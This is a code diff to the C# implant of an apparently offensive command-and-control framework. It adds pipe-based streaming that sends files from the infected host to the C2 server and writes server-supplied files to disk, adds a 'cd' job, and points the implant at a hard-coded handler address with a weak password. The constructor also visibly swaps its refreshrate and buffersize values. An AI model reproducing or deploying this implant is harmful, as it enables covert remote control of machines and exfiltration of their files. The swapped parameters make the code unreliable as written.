@@ -18,9 +18,12 @@ namespace NuagesSharpImplant
 
         JArray Heartbeat(string implantId);
 
-        string GetFileChunk(string fileId, int n);
+        void Pipe2Stream(string pipe_id, int BytesWanted, Stream stream);
+
+        void Stream2Pipe(string pipe_id, Stream stream);
 
     }
+
 
     public class NuagesC2Direct: NuagesC2Connector
     {
@@ -28,9 +31,17 @@ namespace NuagesSharpImplant
 
         private string handler = "Direct";
 
-        public NuagesC2Direct(string connectionString)
+        public int refreshrate;
+
+        public int buffersize;
+
+        public NuagesC2Direct(string connectionString, int buffersize, int refreshrate)
         {
             this.connectionString = connectionString;
+
+            this.refreshrate = buffersize;
+
+            this.buffersize = refreshrate;
         }
 
         public string getConnectionString() {
@@ -120,6 +131,83 @@ namespace NuagesSharpImplant
                 return "";
             }
         }
+        public byte[] PipeRead(string pipe_id, int BytesWanted)
+        {
+            byte[] buffer;
+            using (MemoryStream memory = new MemoryStream())
+            {
+                while (memory.Length < BytesWanted)
+                {
+                    JObject body = new JObject(
+                    new JProperty("pipe_id", pipe_id),
+                    new JProperty("maxSize", Math.Min(this.buffersize, BytesWanted - memory.Length))
+                    );
+                    JObject response = JObject.Parse(this.POST("io", body.ToString()));
+                    buffer = Convert.FromBase64String(response["out"].ToString());
+                    memory.Write(buffer, 0, buffer.Length);
+                    System.Threading.Thread.Sleep(this.refreshrate);
+                }
+                return memory.ToArray();
+            }
+        }
+
+        public void Pipe2Stream(string pipe_id, int BytesWanted, Stream stream)
+        {
+            int ReadBytes = 0;
+            byte[] buffer;
+            while (ReadBytes < BytesWanted)
+            {
+                JObject body = new JObject(
+                new JProperty("pipe_id", pipe_id),
+                new JProperty("maxSize", Math.Min(this.buffersize, BytesWanted - ReadBytes))
+                );
+                JObject response = JObject.Parse(this.POST("io", body.ToString()));
+                buffer = Convert.FromBase64String(response["out"].ToString());
+                ReadBytes += buffer.Length;
+                stream.Write(buffer, 0, buffer.Length);
+                System.Threading.Thread.Sleep(this.refreshrate);
+            }
+        }
+
+        public void Stream2Pipe(string pipe_id, Stream stream)
+        {
+            int ReadBytes = 0;
+            byte[] buffer = new byte[this.buffersize];
+            JObject body;
+            while ((ReadBytes = stream.Read(buffer, 0, this.buffersize)) > 0)
+            {
+                if (ReadBytes < this.buffersize)
+                {
+                    byte[] buffer2 = new byte[ReadBytes];
+                    Array.Copy(buffer, 0, buffer2, 0, ReadBytes);
+                    body = new JObject(
+                    new JProperty("pipe_id", pipe_id),
+                    new JProperty("maxSize", 0),
+                    new JProperty("in", Convert.ToBase64String(buffer2))
+                    );
+                }
+                else
+                {
+                    body = new JObject(
+                    new JProperty("pipe_id", pipe_id),
+                    new JProperty("maxSize", 0),
+                     new JProperty("in", Convert.ToBase64String(buffer))
+                    );
+                }
+                this.POST("io", body.ToString());
+                System.Threading.Thread.Sleep(this.refreshrate);
+            }
+        }
+
+        public byte[] PipeRead(string pipe_id)
+        {
+            JObject body = new JObject(
+                    new JProperty("pipe_id", pipe_id),
+                    new JProperty("maxSize", this.buffersize)
+                );
+            JObject response = JObject.Parse(this.POST("io", body.ToString()));
+            return Convert.FromBase64String(response["out"].ToString());
+        }
     }
 
     public class NuagesC2Implant
@@ -191,7 +279,7 @@ namespace NuagesSharpImplant
 
             this.connectionString = connector.getConnectionString();
 
-            this.supportedPayloads = new string[5];
+            this.supportedPayloads = new string[6];
 
             this.supportedPayloads[0] = "command";
 
@@ -202,6 +290,8 @@ namespace NuagesSharpImplant
             this.supportedPayloads[3] = "upload";
 
             this.supportedPayloads[4] = "configure";
+
+            this.supportedPayloads[5] = "cd";
 
             this.handler = connector.getHandler();
 
@@ -226,11 +316,6 @@ namespace NuagesSharpImplant
 
         public void Heartbeat() {
             this.jobs = this.connector.Heartbeat(this.config["id"]);
-        }
-
-        public string GetFileChunk(string fileId, int n)
-        {
-            return this.connector.GetFileChunk(fileId, n);
         }
 
         public void ExecuteJob(JObject job)
@@ -275,6 +360,23 @@ namespace NuagesSharpImplant
                     }
                     this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, result.Length - (n * maxrequestsize)), moreData: false, error: hasError, n: n);
                 }
+                else if (jobType == "cd")
+                {
+                    string dir = job.SelectToken("payload.options.dir").ToString();
+                    string path = ".";
+                    try
+                    {
+                        path = job.SelectToken("payload.options.path").ToString();
+                    }
+                    catch { }
+                    Directory.SetCurrentDirectory(path);
+
+                    Directory.SetCurrentDirectory(dir);
+
+                    string newDir = Directory.GetCurrentDirectory();
+
+                    this.connector.SubmitJobResult(jobId: jobId, result: newDir, moreData: false, error: false);
+                }
                 else if (jobType == "configure")
                 {
                     JObject config = (JObject)job.SelectToken("payload.options.config");
@@ -299,21 +401,15 @@ namespace NuagesSharpImplant
                     catch { }
                     Directory.SetCurrentDirectory(path);
                     string file = job.SelectToken("payload.options.file").ToString();
-                    
-                    int n = 0;
-                    int chunkSize = Int32.Parse(job.SelectToken("payload.options.chunkSize").ToString());
-                    int length = Int32.Parse(job.SelectToken("payload.options.length").ToString());
-                    string fileId = job.SelectToken("payload.options.file_id").ToString();
+                    string pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
+                    int length = job.SelectToken("payload.options.length").ToObject<int>();
+                    string result = "";
                     using (FileStream fs = new FileStream(file, System.IO.FileMode.Create))
                     {
-                        while (n * chunkSize < length)
-                        {
-                            byte[] buffer = System.Convert.FromBase64String(GetFileChunk(fileId, n));
-                            fs.Write(buffer, 0, buffer.Length);
-                            n++;
-                        }
-                        SubmitJobResult(jobId: jobId, result: fs.Name, moreData: false, error: false);
+                        this.connector.Pipe2Stream(pipe_id, length, fs);
+                        result = fs.Name;
                     }
+                    SubmitJobResult(jobId: jobId, moreData: false, result: result, error: false);
                 }
                 else if (jobType == "upload")
                 {
@@ -325,28 +421,14 @@ namespace NuagesSharpImplant
                     catch { }
                     Directory.SetCurrentDirectory(path);
                     string file = job.SelectToken("payload.options.file").ToString();
-                    int chunkSize = Int32.Parse(job.SelectToken("payload.options.chunkSize").ToString()) * 3/4;
-                    byte[] buffer = new byte[chunkSize];
-                    int bytesRead = 0;
-                    string b64;
+                    string pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
                     string result = "";
                     using (FileStream fs = new FileStream(file, System.IO.FileMode.Open))
                     {
-                        int n = 0;
-                        bool moreData = true;
-                        while (moreData)
-                        {
-                            bytesRead = fs.Read(buffer, 0, chunkSize);
-                            b64 = System.Convert.ToBase64String(buffer, 0, bytesRead);
-                            moreData = (fs.Position != fs.Length);
-                            if (!moreData) {
-                                result = fs.Name;
-                            }
-                            SubmitJobResult(jobId: jobId, data: b64, moreData: moreData, result: result, error: false, n: n);
-                            n++;
-                        }
-                        
+                        this.connector.Stream2Pipe(pipe_id, fs);
+                        result = fs.Name;
                     }
+                    SubmitJobResult(jobId: jobId, moreData: false, result: result, error: false);
                 }
                 else
                 {
@@ -415,16 +497,20 @@ namespace NuagesSharpImplant
     {
     static void Main(string[] args)
         {
-            NuagesC2Direct connector = new NuagesC2Direct("http://127.0.0.1:3030");
-
-            // If the PyAES256 Handler is used:
-            // NuagesC2PyAES256 connector = new NuagesC2PyAES256("http://192.168.49.1:4040", "PASSWORD");
+            // NuagesC2Direct connector = new NuagesC2Direct("http://127.0.0.1:3030", 65536, 100);
 
             Dictionary<string, string> config = new Dictionary<string, string>();
 
             config["sleep"] = "1";
 
-            config["maxrequestsize"] = "50000";
+            // Buffer size for pipes (file transfers / tcp / interactive)
+            config["buffersize"] = "65535";
+
+            // Refreshrate in milliseconds
+            config["refreshrate"] = "100";
+
+            // If the PyAES256 Handler is used:
+            NuagesC2PyAES256 connector = new NuagesC2PyAES256("http://192.168.49.1:18888", "password", 65536, 100);
 
             NuagesC2Implant implant = new NuagesC2Implant(config, connector);
 
